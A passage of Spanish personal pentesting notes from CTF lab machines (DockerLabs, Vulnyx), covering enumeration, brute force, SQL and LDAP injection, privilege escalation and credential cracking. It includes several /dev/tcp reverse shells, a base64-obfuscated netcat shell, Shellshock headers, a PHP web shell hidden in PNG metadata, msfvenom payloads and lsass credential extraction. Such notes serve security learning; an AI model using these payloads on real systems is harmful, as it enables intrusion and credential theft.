ssh-keygen -t rsa -b 4096

presionamos solo enter en todo, hasta que se creen las claves.

las claves se crean en /home/kali/.ssh (en mi caso)

/home/kali/.ssh/id_rsa
/home/kali/.ssh/id_rsa.pub

siempre hay que copiar las claves en un directorio personalizado, en mi caso, /Downloads/hacking

b. una vez generadas tenemos 2 archivos: id_rsa(clave privada) e id_rsa.pub (clave pública, la que se envía al recurso compartido).

hacemos cp id_rsa.pub authorized_keys, este comando nos crea una copia de id_rsa.pub con el nombre authorized_keys


c. creamos el directorio .ssh y dentro del directorio .ssh subimos los arcihivos authorized_keys y el id_rsa.pub en el recurso compartido.

ejemplo

máquina kali:

chmod 600 id_rsa


en máquina objetivo:

smb: \> mkdir .ssh
smb: \.ssh\> put id_rsa.pub 
smb: \.ssh\> put authorized_keys


d. nos conectamos por ssh 

ssh -i id_rsa macarena@172.17.0.1


Nota: este ejemplo funciona también si subimos el id_rsa.pub y el authorized_keys en la carpeta tmp

-------------------------------------------------------------------------------

## 25.- Si tengo un monton de carpetas y quiero verlas todas en una sola salida con la ejecución de un solo comando

me paro dónde están todas las carpetas y ejecuto:

ls -Rl 

ls -Ra -> ver archivos ocultos

-------------------------------------------------------------------------------

## 26.- si hacemos id y vemos que pertenecemos al grupo shadow, entonces podemos sacar los hashes del /etc/shadow y el passwdcrackearlos.

ejecutamos:

en la máquina víctima

cat /etc/passwd > passwd
cat /etc/shadow > shadow

python3 -m http.server 8000


en kali

wget http://172.17.0.2:8000/passwd
wget http://172.17.0.2:8000/shadow

unshadow passwd shadow > hash

luego con john crackeamos:

john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=crypt

-------------------------------------------------------------------------------

## 27.- Git

comando para buscar .git:

find / -name '*.git' 2>/dev/null

ejemplo de respuesta:

/var/www/html/desarrollo/.git

entramos en : /var/www/html/desarrollo

logs del sistema registrados:

podemos ver los logs de git para ver el contenido de cada commit que nos insterese.. 

Ejemplo: máquina report de dockerlabs

https://github.com/DarksBlackSk/writeupdockerlabs/blob/main/report

entramos en la carpeta donde está configurado git y ejecutamos:

git log

si al ejecutar el comando anterior (git log), me aparece:

fatal: detected dubious ownership in repository at '/var/www/html/desarrollo'
To add an exception for this directory, call:

 git config --global --add safe.directory /var/www/html/desarrollo


ejecutamos:

  git config --global --add safe.directory /var/www/html/desarrollo

y si me sigue aparecieno un error, algo así:

fatal: $HOME not set

ejecutamos:

export HOME=/var/www/html/uploads
echo $HOME
/var/www/html/uploads

la variable de entorno HOME puede ser cualquier ruta, incluso la /tmp

siempre y cuando uploads exista.

luego volvemos a ejecutar:

git config --global --add safe.directory /var/www/html/desarrollo

y luego

git log

identificamos el id del commit que nos interesa y ejecutamos:

ejemplo, el id del commit que nos interesa es: 
0baffeec1777f9dfe201c447dcbc37f10ce1dafa

git show 0baffeec1777f9dfe201c447dcbc37f10ce1dafa

-------------------------------------------------------------------------------

## 28.- Sin existe una url /admin.php y es un inicio de sesión, entonces debe existir un usuario llamado admin o administrator o administrador.

podemos hacer ataque con hydra:

hydra -l admin -P /usr/share/wordlists/rockyou.txt "realgob.dl" http-post-form "/admin.php:username=^USER^&password=^PASS^:H=Cookie: PHPSESSID=t4ebcjusiu12d3olhsmneorq9t:F=Usuario o contraseña incorrectos." -F 

la parte de username y password se tiene que verificar en la web, haciendo ctrl + u y ver el formulario, se puede hacer ataque de fuerza bruta con burpsuite también con intruder y sniper.

-------------------------------------------------------------------------------

## 29.- Si tenemos una web personal, como un blog, podemos también hacer fuzzing a rutas como:

/sobre-mi
/contacto
/docencia
/programación
/ciberseguridad

puede que hayan cosas por descubrir, como por ejemplo en la máquina swiss de dockerlabs que se decubrió un login dentro de /sobre-mi y luego un LFI cuando se inició sesión.

-------------------------------------------------------------------------------

## 30.-  Si hacemos un gobuster a http://172.17.0.2/sobre-mi

y aparece como respuesta:

/login.php y como redirreción(en letras azules) -> sms.php

y si hacemos ataque de fuerza bruta al formulario de login y me aparecen un montón de credenciales, entonces significa que debemos de hacer fuerza bruta al /login.php

hacemos fuerza bruta del formulario a /login.php, referencia, máquina swiss de dockerlabs
                                                                    
-------------------------------------------------------------------------------

## 31.- Para máquinas de CTF o practicas de hacking e incluso en la vida real, siempre habrá un administrador como nombre de usuario: y posibles otros nombres de usuario:

administrador
administrator
admin
sysadmin

tenerlo en cuenta para ataques de fuerza bruta para formularios con hydra.                  

-------------------------------------------------------------------------------
                                                                                                       
## 32.- Si previamente hemos agreagado una ip como por ejemplo 172.17.0.2 al /etc/hosts y la hemos relacionado con el dominio realgob.dl para hacer pentesting en una máquina y luego al hacer pentesting en otra máquina que tiene la misma ip y que tiene el puerto 80 abierto y corriendo una web y al momento de ingresar a la web por la ip me redirecciona al relgob.dl se tiene que hacer lo siguiente:

a.- Eliminar la ip del /etc/hosts y si no funciona con esto

b.- Elminar todo el historial

-------------------------------------------------------------------------------

## 33.- podemos ejecutar el siguiente comando si somos el usuario www-data y ver cosas interesantes:

find / -type f -user www-data 2>/dev/null | grep -v proc

Busca en el sistema todos los archivos regulares (-type f) que pertenezcan al usuario www-data.

Descarta cualquier mensaje de error generado durante la búsqueda.

Filtra y elimina de la salida cualquier archivo o directorio que esté relacionado con /proc.

ejemplo: máquina swiss de dockerlabs

-------------------------------------------------------------------------------

## 34.- forma de analizar un binario en mi kali:

strings sendinv2

-------------------------------------------------------------------------------

## 35.- si tengo por ejemplo un input dónde pueda escribir una ip y ver si tengo conectividad con la ip, puedo intentar REC , Ejecución remota de comandos.

En general en cualquier input

para el caso:

172.17.0.2; ls

172.17.0.2; bash -c  "/bin/bash -i >& /dev/tcp/172.17.0.1/443 0>&1"

Otro caso es que me permita ejecutar comando en base 64:

convertimos a base64

nc -e /bin/bash 192.168.42.133 443

bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDIuMTMzIDQ0Mwo=

/???/e??o bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDIuMTMzIDQ0Mwo= | base64 -d | /???/b??h -e

máquina yourwaf vulnyx

-------------------------------------------------------------------------------

## 36.- cuando tenga un problema al cambiar de usuario de usuario bobby a usuario gladys por ejemplo y la conexión por netcat siendo el usuario bobby aún se cae al cambiar a gladys, 

lo que se hace es enviar desde una conexión netcat desde bobby a otra conexión netcat, y en esta nueva conexión recién cambiar de usuario.


ejemplo  máquina pingpong de dockerlabs

-------------------------------------------------------------------------------

## 37.- ejecución de un binario:

hay que darle permiso de ejecución: chmod +x ./secret

./secret

-------------------------------------------------------------------------------

## 38.- Para analizar un binario .ELF utilizamos ghidra

abrimos ghidra > new project > import file (elejimos el binario)

ghidra es para analizar malware.

-------------------------------------------------------------------------------

## 39.- si tenemos una url:

URL = http://g00dj0b.reverse.dl/experiments.php?module=./modules/default.php

esta url pinta para un LFI

-------------------------------------------------------------------------------

## 40.- Hacer fuzzing web con dirsearch

dirsearch -u http://10.10.10.248 -t 16 -e txt,html,php,asp,aspx -f -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

-------------------------------------------------------------------------------

## 41.- Hacer fuzzing web con feroxbuster.

feroxbuster -u 'http://hackzones.hl/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png,git -t 200 --random-agent --no-state -d 5

es bueno usar ambos txt tandoc medium.txt como el common.txt

-------------------------------------------------------------------------------

## 42.- Una manera de enumerar es mirar el código fuente de la web
gg

-------------------------------------------------------------------------------

## 43.- Pasar un archivo de extensión pdf a txt.

se ejecuta dentro de la carpeta dónde estás los pdfs

for file in *.pdf; do pdftotext -layout "$file"; done

-------------------------------------------------------------------------------

## 44.- Buscar la palabra password dentro de un directorio.

grep -rin "password" .

-------------------------------------------------------------------------------

## 45.- Utilizando exiftool sacar el nombre de los creadores de varios archivos pdf.

exiftool -a *.pdf | grep creator | awk '{print $3}' > users.txt

-------------------------------------------------------------------------------

## 46.- Encuentras algo, enumeras, encuentras algo, enumeras.

-------------------------------------------------------------------------------

## 47.- Ingeniería Inversa.

ejemplo:

Reverse : de dockerlabs:

https://github.com/DarksBlackSk/writeupdockerlabs/blob/main/reverse.md

-------------------------------------------------------------------------------

## 48.- Si tengo un formulario hay que ver su código html para ver sus limitaciones y a partir de ahí analizar un ataque.

-------------------------------------------------------------------------------

## 49.- Este comando simula un ataque intruder - sniper attack ed burpsuite:

supongamos que tenemos una pagina con una url:

http://192.168.247.128/hades/d00r_validation.php

y aquí encontramos un formulario con un solo input y un botón submit entonces podemos aplicar este comando

ffuf -ic -c -u http://192.168.247.128/hades/d00r_validation.php -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'word=FUZZ' -w palabras.txt -fs 12

-------------------------------------------------------------------------------

## 50.- Archivo lsass.DMP 

Es un achivo de volcado de memoria (MEMORY DUMP),  asociado al proceso del Servicio de Autenticación de Seguridad Local (LSASS) en Windows.

 Verifica a los usuarios que inician sesión en una computadora o servidor Windows, maneja los cambios de contraseña y crea tokens de acceso. Cuando se vacía la memoria de este proceso, el archivo volcado se puede usar para extraer las credenciales de todos los usuarios que iniciaron sesión. Además, cuando se activa la autenticación WDigest, existe la posibilidad de leer contraseñas en texto sin formato desde la memoria del proceso LSASS. Podemos extraer credenciales de este archivo de volcado usando pypykatz .



python -m venv pypykatz-env

source pypykatz-env/bin/activate

pip install pypykatz

forma de uso:

pypykatz lsa minidump lsass.DMP > resultado.txt

-------------------------------------------------------------------------------

## 51.- si tengo una contraseña encriptada como:

root:$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2:19375:0:99999:7:::

que pertenece a al root del archivo /etc/shadow

la parte a desencriptar es:

$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2

las 2 líneas de arriba las guardamos como pass.hash

foma de crackear:

john -w=/usr/share/wordlists/rockyou.txt pass.hash --format=crypt

johnpass.hash --show

-------------------------------------------------------------------------------

## 52.- si tenememos un archivo ELF(Executable and Linkable Format) en C que lea archivos del sistema: ls

ejemplo:
soy el usuario codebad: y ejecuto sudo -l

User codebad may run the following commands on 76aa71834ef3:
    (metadata : metadata) NOPASSWD: /home/codebad/code

el archivo code es un archivo ELF que solo ejecuta ls

artificio para migrar al usuario metadata :

sudo -u metadata /home/codebad/code "-l /home/metadata/user.txt | bash -c '/bin/bash -i >& /dev/tcp/172.17.0.1/4445 0>&1' "

-------------------------------------------------------------------------------

## 53.-  Un archivo .csr es un Certificate Signing Request (Solicitud de Firma de Certificado) que se utiliza en el proceso de obtención de un certificado digital, contiene información codificada en formato PEM o DER. Suelen incluir:

- Una clave pública asociada

- Información de identificación

- Firma digital del solicitante generaa usano una clave pública. 

la ubicación de este archivo es: 

/usr/share/ssl-cert/decode.csr


como decodificar:

ejecuta el comando:

openssl req -in decode.csr -text -noout

en el resultado de la decodificación debe aparecer algo así:

Attributes:
            challengePassword        :i4mD3c0d3r


Si tengo ssh abierto puedo probar con los diferentes usuarios que haya encontrado con la contraseña encontrada para iniciar sesión por dicho servicio.

-------------------------------------------------------------------------------

## 54.- Si al entrar a la web http://172.17.0.2 nos encontramos con este mensaje:

Bienvenido al servidor CTF Patriaquerida.¡No olvides revisar el archivo oculto en /var/www/html/.hidden_pass!

podemos ver por url el .hidden_pass

escribiendo en la url:

http://172.17.0.2/.hidden_pass

-------------------------------------------------------------------------------

## 55.- Archivos .pem:

los archivos .pem guardan llaves privadas para conectarme por ssh, ssl

tengo un archivo: private_key.pem y un athivo private.txt con el siguiente contenido:

`O��N�����f-�]�T��K.Q�a���mgu�3��i������ȉ����P�+F�8Q[


entonces puedo hacer:

openssl pkeyutl -decrypt -in private.txt -out decrypted.txt -inkey private_key.pem

al ver el contenido del archivo decrypted.txt:

demogorgon

-------------------------------------------------------------------------------

## 56.- La vulnerabilidad SQLi puede estar en una cookie.

cookie: ..... ' and 1=1

cookie:...... ' (select 'a' from limit 1,1)='a

cookie:...... ' (select 'a' from users where username='administrator' limit 1,1)='a

cookie:...... ' (select 'a' from users where username='administrator' limit 1,1)='a

-------------------------------------------------------------------------------

## 57.- A veces los formularios tiene funcionamiento con LDAP:

una posible vulnerabilidad sería LDAP Injection:

https://book.hacktricks.wiki/en/pentesting-web/ldap-injection.html?highlight=LDAP#ldap

user=*)(|(&
pass=pwd)

esto funciono para la máquina:

404-not-found -> dockerlabs

-------------------------------------------------------------------------------

## 58.- Si tenemos una rbash, bash con restricción tenemos que ver que comandos podemos usar, y según eso ver que poemos hacer y si tenemos python3 instalado, podemos probar con el siguiente comando:

python3 -c "import subprocess; subprocess.run('/bin/bash', shell=True)"

y si sigue con la rbas hacemos:

export PATH=/bin

-------------------------------------------------------------------------------

## 59.- formas comunes de codificar:

base32
base64

-------------------------------------------------------------------------------

## 60.- Siempre que tengamos un binario y no esté en gtfobinds lo ejecutamos para ver que hace

ejemplo :

ejecutando sudo -l

(ALL) NOPASSWD: /bin/cube

probamos:

sudo /bin/cube

y supongamos que nos permita intruducir numeros:

introducimos:

a[$(/bin/sh >&2)]+666

y listo somos root

-------------------------------------------------------------------------------

## 61.- Carpeta donde se almacena los reportes de sqlmap

-------------------------------------------------------------------------------

## 62.- Si no conosco que hace un binario puedo ejecutar el comando

man nombre_binario

por ejemplo no conosco que hace el binario /usr/bin/multitail

ejecuto man /usr/bin/multitail

si veo opciones como -l para ejecutar comandos veo la forma de escalar privilegios - revisar el bloc de escalar privilegios en la parte de multitail en sudo -l

-------------------------------------------------------------------------------

## 63.- si tenemos la opción de subir archivos por NFS podemos montarnos sistema de archivos en nuestro kali y subir un archivo.

listar recursos compartidos:

showmount -e 192.168.42.137

ejemplo:

showmount -e 192.168.42.137

me salió

Export list for 192.168.42.137:
/var/www/html *

significa que podemos traernos el sistema de archivos de /var/www/html *


creamos una carpeta para montarnos el sistema:

mkdir -p /mnt/nfs_share

montamos el sistema

sudo mount -t nfs 192.168.42.137:/var/www/html /mnt/nfs_share

creamos una reverse shell:

nano /mnt/nfs_share/reverse.php

el contenido es la reverse shell de pentestmonkey

luego nos ponemos en ecucha con el puerto que le asignamos en el reverse.php

nc -lvnp puerto

y en la url:

http://192.168.42.137/reverse.php

-------------------------------------------------------------------------------

## 64.- Cuando no podemos hacer nada, y tenemos el servicio ssh podemos tratar de ingresar por ssh y en el banner nos puede dar una pista, como algún nombre de usuario.

-------------------------------------------------------------------------------

## 65.- Si pertenezco al grupo shadow puedo modificar el /etc/shadow y cambiarle la contraseña al root, entonces lo dejo sin contraseña.

ejecutamos: id
uid=1000(b.taylor) gid=1000(b.taylor) grupos=1000(b.taylor),42(shadow)

eliminamos desde el $ después de los ":" después de la palabra root hasta antes de los ":"

root:$y$j9T$du9sW7McN8WfjLKPRheP7/$pyE/4IrgDjurpaNzpdyxj8PYcOYyDksyYPG2rxEBxm4:20135:0:99999:7:::


root::20135:0:99999:7:::

ejecutamos su root y no escribimos contraseña

como también podemos crear una contraseña con openssl

openssl passwd password1

copiamos el hash y lo pegamos en el /etc/shadow

## 66.- Cuando tengamos los servicios htttp y ssh y en la web no encontramos nada podemos hacer ataque de fuerza bruta, primero creando una lista de palabras como contraseñas usando palabras de la web, entendiendose que la web es de tipo servicios, portafolio.

este comando genera una diccionario tomando palabras de la web y lo guarda como pass.txt

cewl http://tech.unique.nyx/ --with-numbers -w pass.txt

para el ataque utilizamos hydra y los nombres de usuarios son los nombres que aparecen en la web

hydra -L usernames.txt -P pass.txt ssh://192.168.42.141 -t 64 -I


si tenemos un formulario de inicio de sesión

También podemos interceptar con burpsuite y probar con SQLMAP y derrepente podemos ver que es vulnerable a SQLijection, solo apuntando al parámetro username.

sqlmap -r shop -p username --level 3 --risk 3 --batch

-------------------------------------------------------------------------------

## 67.- Crear entornos virtuales

python3 -m venv nombre_entorno

Activar el entorno virtual

source nombre_entorno/bin/activate

Salir del Entorno Virtual

deactivate

Eliminar el Entorno Virtual

rm -rf nombre_entorno

Verificar si se eliminó

source nombre_entorno/bin/activate

Si te dice "No such file or directory", entonces ya está eliminado correctamente.

-------------------------------------------------------------------------------

## 68.- Si tengo un input de búsqueda entonces también puedo injectar código con ";" seguido de id o otros comandos.

Ejemplo máquina hackingstation de vulnyx

vamos probando algo así

hola;id
hola && 
;id

Lo encodeamos en burpsuite

URLENCODE: bash -c 'bash -i >& /dev/tcp/IP-KALI/443 0>&1'

entonces en la url colocamos:

http://192.168.42.149/exploitQuery.php?product=hola%3BURLENCODE

-------------------------------------------------------------------------------

## 69.- si tenemos una máquina con windows 7 o xp que tienen los siguientes puertos abiertos:

135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds

entonces manejamos el siguiente comando para verificar vulnerabilidades tanto como eternalBlue o :
Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)

sudo nmap -sV --script vuln -p135,139,445 --min-rate 6000 -vvv 10.0.2.8

puede ser vulnerable a 
ms08_067 ->  exploit/windows/smb/ms08_067_netapi

ms17_010 -> exploit/windows/smb/ms17_010_eternalblue

ambos los buscamos en metasploit

-------------------------------------------------------------------------------

## 70.- Si al hacer un escaneo de puertos y servicios con nmap al puerto 80 y veo que tiene un servicio php corriendo y al hacer gobuster solo me muestra el info.php hay que ver los Loaded Modules cargados, pueda ser que haya un modulo que tenga algún exploit.

http://192.168.42.155/info.php

para PHP Version 8.2.7

en Configuration > Loaded Modules

está mod_backdoor que tiene un exploit

clonamos el repositorio

https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor

cd Apache-HTTP-Server-Module-Backdoor

forma de ejecutar el exploit

python exploit.py IP-VÍCTIMA 80

Podemos ver también User/Group puede que haya algún usuario

En conclusión podemos observar la configuración del archivo info.php:

Loaded Modules
User/Group

-------------------------------------------------------------------------------

## 71.- Los archivos .bak son archivos de backup

ejemplo tenemos el archivo connect.bak

si estamos en linux podemos verlos como:

cat connect.bak

si está en un servidor web podemos verlo:

curl -s http://192.168.42.158/directorio/connect.bak

si tengo un archivo sam.bak o SAM.bak y al hacer 

file sam.bak o file SAM.bak

sam.bak: MS Windows registry file, NT/2000 or above

necesito de un system.bak o SYSTEM.bak para poder ver los hashes

samdump2 system.bak sam.bak > hashes.txt

me aparece:

admin:1005:7cc48b08335cd858aad3b435b51404ee:556a8f7773e850d4cf4d789d39ddaca0:::

Crackear 

john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt



-------------------------------------------------------------------------------

## 72.- Variable de entorno PATH

PATH le dice al sistema dónde buscar ejecutables cuando tú escribes un comando en la terminal. Si ejecutas, por ejemplo, ls o python3, el sistema usa los directorios listados en PATH para buscar ese ejecutable.

Esto define la variable PATH y establece una lista de directorios, separados por : (dos puntos), en los cuales el sistema buscará comandos para ejecutar.

existen varios tipos tales como:

PATH (usuario)	

Shell de usuario (bash, zsh)	

Usuario actual

comando

echo $PATH



PATH (sistema)	

/etc/environment, /etc/profile	

Todos los usuarios

comando

cat /etc/environment

cat /etc/profile | grep PATH

cat /etc/bash.bashrc | grep PATH
...................................................................................................

PATH (script)	

Dentro de scripts de shell	

Solo dentro del script

comando

echo -e '#!/bin/bash\necho "PATH del script: $PATH"' > script.sh

chmod +x script.sh

./script.sh

...................................................................................................

PATH (cron)	

En trabajos programados (crontab)	

Solo en tareas cron

comando

cat /etc/crontab | grep -i path

crontab -i

...................................................................................................

PATH (systemd)	

En servicios (.service)	

Proceso del servicio

comando

grep -r "Environment=" /etc/systemd/system/

systemctl cat nombre-del-servicio

Busca una línea como

Environment="PATH=/custom/bin:/usr/bin:/bin"

-------------------------------------------------------------------------------

## 73.- Si tengo el puerto ssh y http Apache abierto y veo que no se puede hacer nada más, entonces procedo lanzar un curl

curl IP-VÍCTIMA -I

para ver encabezados HTTP (HEAD request)

no descarga el contenido del cuerpo de la página

curl IP-VÍCTIMA -S

descarga el contenido de la página

parámetros

-I	Muestra solo los headers (HEAD request).
-s	Modo silencioso (sin progreso, sin errores).
-L	Sigue redirecciones automáticamente (301/302).
-v	Verboso, muestra detalles del proceso HTTP.
-o file	Guarda la respuesta en un archivo.
-A	Define el User-Agent.
-H	Añade headers personalizados (como cookies o                       tokens).
-u user:pass	Autenticación HTTP básica.

reverse shell

nos ponemos en escucha con netcat y ejcutamos

curl http://192.168.1.121/reverse.php

## 74.- Si tengo un puerto http y ya agoté los recursos para enumerar, hice fuzzing web y no funciona entonces pruebo con puertos UDP.

los puerto más comunes 67,68,69,82

sudo nmap -sU -p 67,68,69,82 IP-VICTIMA

-------------------------------------------------------------------------------

## 75.- Cuando estoy editando un archivo de texto y se cierra inesperadamente, los archivos cerrados tienen las siguientes extensiones:

.tmp

.swp -> Vim

.asd  -> Microsoft word

.bak -> backups

.~      -> puede ser al inicio o final del nombre del archivo para crear copias de seguridad.

-------------------------------------------------------------------------------

## 76.- A veces cuando tenemos conexión por ssh y no podemos escalar privilegios, pero tenemos un servidor web corriendo en la víctima, podemos subir un reverse shell en /var/www/html a veces el usuario www-data nos permite escalar privilegios

-------------------------------------------------------------------------------

## 77.- Si un archivo se está editando y no se cierra el editor de manera inesperada, las extensiones que se guardan el archivo no editado completamente depende del editor que se estaba utilizando:

nano -> .swp, .save, archivo~
vim / neovim -> .swp, .swo
gedit -> archivo~
emacs  -> #archivo#, archivo~
mousepad (XFCE) -> archivo~

-------------------------------------------------------------------------------

## 78.- Si tenemos acceso a la carpeta cgi-bin

referencia máquina shock - vulnyx

cgi-bni es una carpeta utilizada para alojar scripts que interactuarán con el navegador web, en esta carpeta se alojan archivos como .sh, .cgi

hacemos una búsqueda

wfuzz -c -t 200 --hc=404 --hw=1 -w /usr/share/seclists/Discovery/Web-Content/common.txt -z list,sh-cgi "http://192.168.1.14/cgi-bin/FUZZ.FUZ2Z"

si encontramos un archivo como shell - sh con estado 500

me permite ejecutar comandos:

curl -H "user-agent: () { :; }; echo;echo; /bin/bash -c 'id'" http://IP-VICTIMA/cgi-bin/shell.sh


resultado:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

ejecutamos para acceder a la máquina

enviamos una bash

curl -H "user-agent: () { :; }; echo;echo; /bin/bash -c 'bash -c 'bash -i >& /dev/tcp/IP-KALI/POT-ATACK 0>&1''" http://IP-VICTIMA/cgi-bin/shell.sh

nos ponemos en escucha con netcat y listo

-------------------------------------------------------------------------------

## 79.- netcat también sirve para transferir archivos

en kali:

se ejecuta primero

nc -lvnp 1234 > root.gpg

se guarda en la carpeta dónde ejecutamos el comando de arriba.



en víctima:

se ejecuta después:

nc IP-KALI 1234 < root.gpg

-------------------------------------------------------------------------------

## 80.- si tenemos un repositorio .git

siempre hay que ver los commits


lo que se puede ver:


archivos que podemos traer a kali

se puede extraer cosas que se han borrado, se enumera y se puede traer

texto sensible

puedes subir un archivo malicioso a la web

utilizamos git-dumper

pip install git-dumper

si me sale error utilizamos un entorno virtual

ver el apunte 66 de apuntes.txt

utilizamos git-dumper

git-dumper http://192.168.42.177/.git dump 

luego cd  dump

hacemos ls -la

debe aparecer el .git

o también podemos ejecutar:

wget --mirror -I .git http://192.168.42.177/.git/

y se trae todo en una carpeta llamada 192.168.42.177


ver todos los commits:

git log --all

resultado

commit 2b5a7479c36d425981b95982c37b10a34ce11aca (HEAD -> master)
Author: charlie <charlie@hit.nyx>
Date:   Mon Feb 3 23:33:01 2025 +0100

    Commit #5

comando para ver el contenido de todos los commits:

git log --all | grep "commit" | cut -d " " -f2 | xargs git show

-------------------------------------------------------------------------------

## 81.- Ver achivos .db

generalmente los archivo .db son SQLite

asegurarme que sea un SQLite

file database.db

Si es una base de datos SQLite, mostrará algo como:
SQLite 3.x database, ....

ver si tengo instalado el sqlite3

sqlite3 --version

si está instalado me mostrará algo como 
3.37.2 2022-01-06 13:25:41 ...

sqlite3 database.db

# Dentro de SQLite3:
.tables          # Listar tablas
.schema users    # Ver estructura de la tabla 'users'
SELECT * FROM users;  # Consulta SQL
.exit           # Salir

## 78.- comando sudo

si al ejecutar sudo -l 

me aparece el mensaje 

-bash: sudo: orden no encontrada

entonces buscamos el binario sudo:

find / -name sudo -type f -exec ls -ld {} \; 2>/dev/null

si me aparece algo como:

rwsr-xr-x 1 root root 182600 ene 21 10:49 /usr/sbin/sudo

significa que sudo tiene permiso de root en ejecución para otros usuarios

entonces ejecutamos:

/usr/sbin/sudo -l

-------------------------------------------------------------------------------

## 82.- Es bueno analizar el script.min.js

-------------------------------------------------------------------------------

## 83.- En algunas ocasioes hay softwares que se ejecutan en la máquia víctima por allgún puerto pero no se pueden accerder al software fuera de ella, podemos hacer un port forwarding:

primero hacemos ss -ltun para ver el puerto dónde se ejecuta el software

PORT FORWARDING

realiza una redirección de puertos (port forwarding) para permitir que conexiones externas al puerto 10001 se redirijan al puerto 10000 en localhost (la misma máquina víctima)

socat TCP-LISTEN:10001,fork TCP4:127.0.0.1:10000&

socat:
Herramienta para crear conexiones bidireccionales entre dispositivos, puertos, archivos, etc. Es como una navaja suiza para redes.

TCP-LISTEN:10001,fork:

TCP-LISTEN:10001: Escucha conexiones entrantes en el puerto 10001 (TCP).

fork: Permite aceptar múltiples conexiones simultáneas (sin este parámetro, socat se cerraría tras la primera conexión).

TCP4:127.0.0.1:10000:

Redirige el tráfico recibido en el puerto 10001 al puerto 10000 en la dirección local (127.0.0.1, IPv4).

&:
Ejecuta el proceso en segundo plano (para que no bloquee la terminal).

referencia máquia psymin vulnyx


otra forma:

al hacer ss -tuln

Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port 

tcp  LISTEN  0    128    127.0.0.1:22        0.0.0.0:*   

Netid  -> tcp  
State  ->  LISTEN  
Recv-Q -> 0
Send -> 128    
Local Address:Port -> 127.0.0.1:22
Peer Address:Port -> 0.0.0.0:*


Primero, obtengamos un shell en Metasploit y luego realicemos el reenvío de puertos. Hay muchas otras maneras de realizar el reenvío de puertos, pero la de Metasploit es más simple y sencilla. Para obtener un shell en Metasploit, primero cree un archivo elf con msfvenom y luego enviar a la máquina víctima mediante un servidor Python3.

msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=IP-kali LPORT=PORT-KALI -f elf -o shel.elf

lo suimos a la máquia víctima:

# Python server
$ python3 -m http.server 80

una vez subida le damos chmod +x shel.elf

msfconsole -q

use exploit/multi/handler
set payload linux/x64/meterpreter_reverse_tcp
set LHOST=IP-KALI
set LPORT=PORT-shel.elf
run

Ahora reenvíemos nuestro puerto 22 a nuestra máquina atacante usando:

portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <REMOTE_IP>

portfwd add -l 101 -p 22 -r 127.0.0.1

-l para puerto local
-p para puerto remoto
-r host remoto

Ahora obtengamos un shell , para este caso usando ssh

me tiene que salir el siguiente mensaje:

[*] Forward TCP relay created: (local) :101 -> (remote) 127.0.0.1:22


ssh root@127.0.0.1 -p 101

escribimos la contraseña


-------------------------------------------------------------------------------

## 84.- Si tengo algún puerto que desconozco y ya sea udp o tcp, busco un exploit o una herramienta para auditarlo..

Ejemplo máquina call de vulnyx

-------------------------------------------------------------------------------

## 85.- Crear una web shell con una imagen .png

primero creamos una imagen en blanco.

convert -size 150x150 xc:white daniel.png 

luego cargamos la web shell cmd en la imagen daniel.png
exiftool -comment='<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' daniel.png

accedemos donde está la imagen

así es como se guarda la imagen en el servidor:

9551640368051400adf634.83527497.png

http://twitx.nyx/private.php?folder=upload&file=9551640368051400adf634.83527497.png&cmd=comando

ahora para acceder a la máquina podemos cargar un revshell rev.php


ejemplo:

con wget

http://twitx.nyx/private.php?folder=upload&file=9551640368051400adf634.83527497.png&cmd=wget http://192.168.42.133/rev.php

con busybox

http://twitx.nyx/private.php?folder=upload&file=9551640368051400adf634.83527497.png&cmd=busybox wget http://192.168.42.133/rev.php

-------------------------------------------------------------------------------

## 86.- Desencriptar bcrypt

echo "hash-bcrypt" > hash.txt

echo "$2y$10$OZh9Cqq7PupktlS/LbtJu.c4bFXWUaTW3zAbmS1litThpCfMAurtm" > hash.txt

hashid hash.txt

resultado:

--File 'hash.txt'--
Analyzing '$2y$10$OZh9Cqq7PupktlS/LbtJu.c4bFXWUaTW3zAbmS1litThpCfMAurtm'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
--End of file 'hash.txt'-- 


cracking Johntheripper

john --wordlist=/usr/share/wordlists/rockyou.txt --forma=bcrypt hash.txt

-------------------------------------------------------------------------------

## 87.- Siempre que tengamos la versión de un software, CMS hay que buscar por versiones altas también

Ejemplo

Tengo el CMS Joomla 4.2.7 pero también puedo buscar por Joomla 4.2.

searchsploit Joomla 4.2.7

o 

searchsploit Joomla 4.2.

y probar con cuál me funciona


-------------------------------------------------------------------------------

## 88.- Si no podemos ejecutar comando como ifconfig o ip a, es porque estmos dentro de un contenedor.

tenemos que ser root y ver algún id_rsa o algo para conectarme por ahí

estando en contenedor no me permite ver archivos dentro de carpetas dentro de usuarios del sistema incluso siendo root.

-------------------------------------------------------------------------------

## 89.- Si dentro de la máquina encontramos un dominio como:

www.yourwaf.nyx entonces guardamos en el /etc/hosts lo siguiente

IP-VÍCTIMA                         www.yourwaf.nyx yourwaf.nyx

y procedemos a hacer fuzzing web a cualquier de los 2 dominios

## 90.- Si tenemos un código, hay que leerlo y entender que es lo que hacer, me puede llevar a ver id_rsa, contraseñas, etc



ejemplo archivo server.js  máquina yourwaf vulnyx

